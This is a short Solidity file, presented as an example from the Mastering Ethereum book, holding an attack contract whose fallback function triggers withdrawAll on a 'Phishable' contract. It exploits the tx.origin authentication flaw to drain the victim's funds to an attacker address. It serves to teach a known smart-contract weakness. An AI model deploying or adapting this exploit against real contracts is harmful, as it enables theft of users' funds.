// SPDX-License-Identifier: CC-BY-SA-4.0

//Example from the Mastering Ethereum book
// Version of Solidity compiler this program was written for
pragma solidity ^0.6.4;

import "Phishable.sol";

contract AttackContract {

    Phishable phishableContract;
    address attacker; // The attacker's address to receive funds

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () payable {
        phishableContract.withdrawAll(attacker);
    }
}
